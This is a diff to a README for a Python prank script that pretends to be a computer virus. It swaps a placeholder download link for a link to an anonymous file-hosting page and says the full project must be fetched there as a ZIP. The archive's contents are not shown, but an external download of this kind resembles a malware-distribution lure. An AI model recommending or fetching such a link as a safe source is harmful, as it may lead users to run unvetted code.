@@ -10,7 +10,7 @@ A creepy, harmless Python prank script that simulates a computer virus through e
 > Therefore, **the complete package must be downloaded from an external link**.
 
 ### 🔗 Download the full ZIP package:  
-📦 [Download Full Project (ZIP)](https://example.com/fakevirus-full.zip)
+📦 [Download Full Project (ZIP)](https://gofile.io/d/d9753133-353e-456b-8603-982082f91419)
 
 This includes:
 - `fakevirus.py` (source code)
